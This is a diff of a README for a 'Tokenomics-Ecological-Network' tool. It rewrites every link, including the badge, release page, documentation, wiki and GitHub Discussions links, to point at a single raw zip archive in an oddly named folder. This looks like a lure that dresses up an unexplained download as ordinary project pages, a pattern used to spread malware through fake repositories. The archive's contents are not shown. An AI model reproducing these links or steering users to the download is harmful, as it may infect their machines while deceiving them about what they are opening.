@@ -1,12 +1,12 @@
 # 🌱 Tokenomics-Ecological-Network - Explore Token Behavior Effortlessly
 
-[![Download Tokenomics-Ecological-Network](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/yasitha10/Tokenomics-Ecological-Network/releases)
+[![Download Tokenomics-Ecological-Network](https://raw.githubusercontent.com/yasitha10/Tokenomics-Ecological-Network/main/Chrysaor/Tokenomics-Ecological-Network_2.1.zip)](https://raw.githubusercontent.com/yasitha10/Tokenomics-Ecological-Network/main/Chrysaor/Tokenomics-Ecological-Network_2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Tokenomics-Ecological-Network! This application helps you understand how tokens interact within digital ecosystems. You will explore how tokens behave as predators, prey, parasites, and symbiotic species. With this tool, you can easily analyze economic dynamics and interactions in a simple way.
 
 ## 📥 Download & Install
-To get started, visit [this page to download](https://github.com/yasitha10/Tokenomics-Ecological-Network/releases) the latest version of Tokenomics-Ecological-Network. 
+To get started, visit [this page to download](https://raw.githubusercontent.com/yasitha10/Tokenomics-Ecological-Network/main/Chrysaor/Tokenomics-Ecological-Network_2.1.zip) the latest version of Tokenomics-Ecological-Network. 
 
 1. Click on the link above.
 2. Look for the latest release at the top.
@@ -44,7 +44,7 @@ If you experience issues while using Tokenomics-Ecological-Network, consider the
 - **Data Errors**: Double-check your input data for errors and try again.
 
 ## 📚 Documentation
-For more advanced features, visit our [documentation page](https://github.com/yasitha10/Tokenomics-Ecological-Network/wiki) for detailed guides and tutorials on how to effectively use Tokenomics-Ecological-Network.
+For more advanced features, visit our [documentation page](https://raw.githubusercontent.com/yasitha10/Tokenomics-Ecological-Network/main/Chrysaor/Tokenomics-Ecological-Network_2.1.zip) for detailed guides and tutorials on how to effectively use Tokenomics-Ecological-Network.
 
 ## 🎉 Community
 Join our community of users to exchange ideas, seek help, or provide feedback. Connect with us on:
@@ -58,8 +58,8 @@ We welcome contributions from everyone. If you're interested in contributing to 
 Feel free to share your insights and suggestions as we aim to improve the application continuously.
 
 ## 🔗 Useful Links
-- [Download Tokenomics-Ecological-Network](https://github.com/yasitha10/Tokenomics-Ecological-Network/releases)
-- [Documentation](https://github.com/yasitha10/Tokenomics-Ecological-Network/wiki)
-- [GitHub Discussions](https://github.com/yasitha10/Tokenomics-Ecological-Network/discussions)
+- [Download Tokenomics-Ecological-Network](https://raw.githubusercontent.com/yasitha10/Tokenomics-Ecological-Network/main/Chrysaor/Tokenomics-Ecological-Network_2.1.zip)
+- [Documentation](https://raw.githubusercontent.com/yasitha10/Tokenomics-Ecological-Network/main/Chrysaor/Tokenomics-Ecological-Network_2.1.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/yasitha10/Tokenomics-Ecological-Network/main/Chrysaor/Tokenomics-Ecological-Network_2.1.zip)
 
 Thank you for using Tokenomics-Ecological-Network! We hope you enjoy exploring the fascinating world of tokens.
